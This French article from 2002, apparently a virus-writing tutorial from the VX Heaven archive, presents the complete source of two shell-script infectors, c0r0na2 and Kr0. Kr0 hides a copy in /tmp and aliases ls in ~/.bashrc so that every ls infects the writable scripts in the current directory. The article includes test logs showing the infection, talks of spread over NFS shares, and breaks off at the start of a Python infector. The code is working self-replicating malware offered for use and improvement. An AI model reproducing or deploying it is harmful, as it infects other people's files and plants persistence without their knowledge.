<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Emper0r 'L'attaque des scripts: Épisode 2' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Emper0r"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Emper0r,L'attaque des scripts: Épisode 2, emper, cobaye, rwxr, python, laptop, echo, vous, shell, drwxr, commande, grep, bashrc, infection, article, chmod"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3ebc7670ec32486408c5e382240cfd7cbfa93737-1498757923-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vem02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>L'attaque des scripts: Épisode 2</h1><p><a href="/lib/?lang=fr&amp;author=Emper0r"> Emper0r</a><br/> <em> 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vem02.html';</script>[<a style="" href="/lib/?lang=FR&amp;index=MA#vem02">Back to index</a>] [<a href="/lib/vem02.html#disqus_thread">Comments</a>]<br/> 
 
<h2>Sommaire</h2>
<ol type="I">
<li>Introduction.</li>
<li>Optimisation du virus c0r0na.</li>
<li>Fonction permettant de devenir résident.
<ol type="A">
<li>The fameuse fonction</li>
<li>Kr0: Le code complet</li>
<li>Les tests</li>
<li>Conclusion</li>
</ol></li>
<li>Infection des scripts python.</li>
<li>A venir</li>
</ol>
<h2>I. Introduction</h2>
<p>Cet article fait suite à mon texte sur l'infection des scripts sous linux, parut dans IOC#4.</p>
<p>Voici les détails que je voulais ajouter:</p>
<ul>
<li>Quelques optimisations des précédent virus.</li>
<li>Une méthode pour être d'une certaine façon résident</li>
<li>Infection des scripts python</li>
</ul>
<p>Je dit 'd'une certaine façon résident' car le virus n'est pas vraiment résident en mémoire, on détourne une fonction pour l'appeler à chaque fois.</p>
<h2>II. Optimisation du virus c0r0na</h2>
<p>Voici la 2ème version de mon virus c0r0na, j'ai trouvé quelques nouvelles techniques pour l'optimiser. L'article commençe par ce code car il va nous servir pour la suite:</p>
<p>Virus parasite c0r0na2 infecteur de shell scripts:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
<span style="color: #666666; font-style: italic;">#c0r0na2</span><br/>
<span style="color: #000000; font-weight: bold;">for</span> f <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> shell <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$f</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$f</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">2</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> c0r0na<span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null;<span style="color: #000000; font-weight: bold;">then</span><br/>
<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">&gt;</span>.a<br/>
<span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">11</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #007800;">$f</span><br/>
<span style="color: #c20cb9; font-weight: bold;">cat</span> .a <span style="color: #000000; font-weight: bold;">&gt;&gt;</span><span style="color: #007800;">$f</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
<span style="color: #000000; font-weight: bold;">fi</span>;<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<p>Petite explication sur le test pour ceux qui non pas l'habitude des shell scripts:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#Si</span><br/>
<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> shell &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#le fichier trouver '$f' est un shell script</span><br/>
<span style="color: #000000; font-weight: bold;">&amp;&amp;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#et</span><br/>
<span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$f</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$f</span> <span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#qu'il est un fichier accessible en écriture</span><br/>
<span style="color: #000000; font-weight: bold;">&amp;&amp;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#et</span><br/>
<span style="color: #000000; font-weight: bold;">!</span> <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">2</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> c0r0na<span style="color: black;">&#41;</span> &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#qu'il ne contient pas de signature virale</span><br/>
<span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#(Redirection des sortie des grep)</span><br/>
<span style="color: #000000; font-weight: bold;">then</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#Alors: ...</span><br/>
&nbsp;</div>
<p>Amélioration de cette version:</p>
<ul>
<li>11 lignes au lieu de 18</li>
<li>Création d'un seul fichier temporaire au lieu de deux (gain de rapidité)</li>
<li>187 octets au lieu de 239</li>
</ul>
<p>Quasiment toute l'optimisation vient du fait que tous les tests sont effectués en une seule fois. Je pense qu'il y a peut être encore moyen de l'améliorer en supprimant la création fichier temporaire qui sert à la sauvegarde du script original.</p>
<p>Pour d'éventuels tests faites ça sur votre bécane...</p>
<h2>III. Fonction permettant de devenir résident</h2>
<p>Dans mon précédent article, ce qui m'a posé le plus de problèmes c'était de trouver comment traverser les répertoires pour que mon virus puisse se propager sur tout le disque.</p>
<p>Ne trouvant pas la solution, quelques recherches sur le net m'ont amenées sur un article de ThreaT (www.chez.com/mvm) qui a codé une sorte de virus ressemblant a c0r0na. Le sien traverse très bien les répertoires, et sa technique est astucieuse.</p>
<p>Il obtient une sorte de mode pseudo-résident en détournent une/des commandes.</p>
<h3>A. The fameuse fonction</h3>
<p>Grâce aux alias on peut détourner une commande par ex la commande ls. Les alias sont écrits dans le ~/.bashrc et fonctionnent de cette façon:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #7a0874; font-weight: bold;">alias</span> <span style="color: #007800;">ls</span>=<span style="color: #ff0000;">'commande-a-executer'</span><br/>
&nbsp;</div>
<p>Donc ce que nous allons faire c'est détourner la commande ls vers une souche virale cachée à un endroit et ensuite exécuter le vrai /bin/ls. Voici la petite fonction qui permet cela et qui sera ajouter a mon virus c0r0na.</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
<span style="color: #666666; font-style: italic;">#Kr0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#nouveau nom, nouvelle signature ;)</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-f</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx <span style="color: black;">&#93;</span>; <span style="color: #000000; font-weight: bold;">then</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#Teste si la souche virale existe</span><br/>
&nbsp; &nbsp;<span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">25</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#sinon on la crée</span><br/>
&nbsp; &nbsp;<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;/bin/ls <span style="color: #000099; font-weight: bold;">\$</span>*&quot;</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#Ajout de la commande pour exécuter le ls</span><br/>
&nbsp; &nbsp;<span style="color: #c20cb9; font-weight: bold;">chmod</span> +x <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #666666; font-style: italic;">#Cette souche doit être exécutable</span><br/>
<span style="color: #000000; font-weight: bold;">fi</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">if</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx ~<span style="color: #000000; font-weight: bold;">/</span>.bashrc <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null; <span style="color: #000000; font-weight: bold;">then</span> <span style="color: #666666; font-style: italic;">#Teste si commande ls détourné</span><br/>
&nbsp; &nbsp;<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;alias ls='/tmp/.vx'&quot;</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> ~<span style="color: #000000; font-weight: bold;">/</span>.bashrc &nbsp; &nbsp; <span style="color: #666666; font-style: italic;">#sinon on la détourne</span><br/>
<span style="color: #000000; font-weight: bold;">fi</span><br/>
&nbsp;</div>
<h3>B. Kr0: Le code complet</h3>
<p>Virus parasite Kr0 pseudo-résident infecteur de shell scripts, copyleft Emper0r:</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
<span style="color: #666666; font-style: italic;">#Kr0</span><br/>
<span style="color: #007800;">v</span>=<span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>.vx<br/>
<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #000000; font-weight: bold;">!</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> <span style="color: #007800;">$v</span> ~<span style="color: #000000; font-weight: bold;">/</span>.bashrc <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$v</span> <span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null;<span style="color: #000000; font-weight: bold;">then</span><br/>
<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">15</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;/bin/ls <span style="color: #000099; font-weight: bold;">\$</span>*&quot;</span><span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #007800;">$v</span><br/>
<span style="color: #c20cb9; font-weight: bold;">chmod</span> +x <span style="color: #007800;">$v</span><br/>
<span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">&quot;alias ls='<span style="color: #007800;">$v</span>'&quot;</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span>~<span style="color: #000000; font-weight: bold;">/</span>.bashrc;<span style="color: #000000; font-weight: bold;">fi</span><br/>
<span style="color: #000000; font-weight: bold;">for</span> f <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
<span style="color: #000000; font-weight: bold;">do</span><br/>
<span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">file</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> shell <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$f</span> <span style="color: #660033;">-a</span> <span style="color: #660033;">-w</span> <span style="color: #007800;">$f</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #000000; font-weight: bold;">!</span> <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">2</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">grep</span> Kr0<span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null;<span style="color: #000000; font-weight: bold;">then</span><br/>
<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$f</span> <span style="color: #000000; font-weight: bold;">&gt;</span>.a<br/>
<span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-n</span> <span style="color: #000000;">15</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #007800;">$f</span><br/>
<span style="color: #c20cb9; font-weight: bold;">cat</span> .a <span style="color: #000000; font-weight: bold;">&gt;&gt;</span><span style="color: #007800;">$f</span><br/>
<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #660033;">-f</span> .a<br/>
<span style="color: #000000; font-weight: bold;">fi</span>;<span style="color: #000000; font-weight: bold;">done</span><br/>
&nbsp;</div>
<h3>C. Les tests</h3>
<p>Pour mes tests je crée 2 répertoires de test, 'test1' et 'test2' contenant chacun 10 scripts cobaye.</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbbeb6abbea9eba99bb7baabafb4ab">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test1]$ ls -al
total 48
drwxr-xr-x    2 emper0r  emper0r      4096 sep  6 15:26 ./
drwxr-xr-x    4 emper0r  emper0r      4096 sep  6 15:24 ../
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t1*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t2*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t3*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t4*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t5*
-rwxr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t6*
----------    1 emper0r  emper0r        34 sep  6 15:26 t7   &lt;- chmod 000 t7
-r-xr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t8*  &lt;- chmod -w t8
----------    1 emper0r  emper0r        34 sep  6 15:26 t9   &lt;- chmod 000 t9
</pre>
<p>le répertoire test2 est identique, j'ai modifié quelques droits de fichier pour vérifier qu'aucun message d'erreurs apparaît.</p>
<p>Aller on lançe ce virus :
(Attention si vous voulez le tester alors faite le sur votre bécane, et uniquement si vous savez ce que vous faites. N'oubliez pas de vous désinfecter après les tests, même si le virus ne présente aucun danger direct.)</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="781d15081d0a480a381419080c1708">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> etudeioc5]$ ./Kr0
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6e0b031e0b1c5e1c2e020f1e1a011e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> etudeioc5]$ cat ~/.bashrc
# .bashrc

# User specific aliases and functions

# Source global definitions
if [ -f /etc/bashrc ]; then
        . /etc/bashrc
fi

alias ls='/tmp/.vx'                      &lt;- parfait la commande ls est détourné
</pre>
<p>En fessant un cat /tmp/.vx on peut voir que le fichier contient bien notre souche virale et le très important: /bin/ls $* en dernière ligne, ce qui permet d'exécuter la véritable commande ls tout en gardant les paramètres.</p>
<p>Pour que l'alias soit pris en compte, je doit faire un exit pour delogger. Je me relog et vais dans mes répertoires de test y faire un petit 'ls' pour voir si tout ce passe comme prévu.</p>
<pre>
[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7d2dac7d2c587c5f7dbd6c7c3d8c7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> test1]$ ls -al
total 48
drwxr-xr-x    2 emper0r  emper0r      4096 sep  7 03:40 .
drwxr-xr-x    4 emper0r  emper0r      4096 sep  6 15:55 ..
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t1
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t2
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t3
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t4
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t5
-rwxr-xr-x    1 emper0r  emper0r       370 sep  7 03:40 t6
----------    1 emper0r  emper0r        34 sep  6 15:26 t7
-r-xr-xr-x    1 emper0r  emper0r        34 sep  6 15:26 t8
----------    1 emper0r  emper0r        34 sep  6 15:26 t9
</pre>
<p>Héhé c'est pas beau ca ?! juste en fessant un 'ls' tous les scripts accessible en écriture on été parfaitement infectés, le ls est bien exécuté avec les paramètres. En copiant et exécutant un script infecté du répertoire test1 dans test2, je voit, a l'aide d'un cat, que le script fonctionne toujours et infecte bien le dossier.</p>
<p>Aucun message d'erreur, les paramètres passés au ls ont bien fonctionnés et les scripts infecté fonctionne toujours correctement.</p>
<p>Tout ca en simplement 15 lignes et 336 octets!!</p>
<p>Si quelqu'un sait comment encore améliorer ca: mail <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="690c04190c1b591b291a0c0a1c1b0c1b06061d470a060447">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> Si c'est juste pour gagner 3 octets en supprimant quelques espaces c'est pas la peine ;)</p>
<h3>D. Conclusions</h3>
<p>Inconvénient de cette technique, c'est pas très discret!</p>
<ul>
<li>Ralentit un peu le 'ls' sur de petite bécane ou dans de gros dossiers.</li>
<li>Si l'alias du 'ls' est découvert dans le ~/.bashrc c'est foutu</li>
<li>Une souche virale cachée avec son chemin écrit dans le ~/.bashrc</li>
</ul>
<p>Mais cette fois au moins notre virus peut se propager sur tout le disque et sur le réseau (ex: partage NFS) juste pas un simple ls.</p>
<p>Je ne vois pas d'autre solution pour faire la même chose de façon plus discrète, sinon il faudrait être root... Si vous avez une autre solution même totalement différente ou même encore moins discrète je suis quand même preneur...</p>
<h2>IV. Infection des scripts python</h2>
<p>Voici encore un langage de scripts ; celui-ci tourne sous linux/unix windows &amp; MacOS. Je ne suis vraiment pas un pro du python. Ce virus a été écrit en une nuit, avec une mini doc sur le python, alors que je n'avait jamais fait de python avant.</p>
<p>Donc soyez compréhensifs si mon code est pas terrible, merci ;)</p>
<p>Virus parasite bUd infecteur de scripts python, copyleft Emper0r:</p>
<div class="python" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">#!/usr/bin/python</span><br/>
<span style="color: black; font-style: italic;">#bUd</span><br/>
<span style="color: #ff7700;font-weight:bold;">import</span> &nbsp;<span style="color: #dc143c;">os</span><span style="color: #66cc66;">,</span> <span style="color: #dc143c;">sys</span><br/>
fileList <span style="color: #66cc66;">=</span> <span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><br/>
<span style="color: #008000;">dir</span> <span style="color: #66cc66;">=</span> <span style="color: #483d8b;">'./'</span><br/>
fileList <span style="color: #66cc66;">=</span> <span style="color: #dc143c;">os</span>.<span style="color: black;">listdir</span><span style="color: black;">&#40;</span><span style="color: #008000;">dir</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">#liste les fichiers du répertoire courant</span><br/>
<span style="color: #ff7700;font-weight:bold;">for</span> <span style="color: #008000;">file</span> <span style="color: #ff7700;font-weight:bold;">in</span> fileList: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#pour chaque fichiers</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff7700;font-weight:bold;">try</span>:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hdl<span style="color: #66cc66;">=</span><span style="color: #008000;">open</span><span style="color: black;">&#40;</span><span style="color: #008000;">file</span><span style="color: #66cc66;">,</span> <span style="color: #483d8b;">'r+'</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">#on essaye de l'ouvrir</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pyt<span style="color: #66cc66;">=</span>hdl.<span style="color: #dc143c;">readline</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
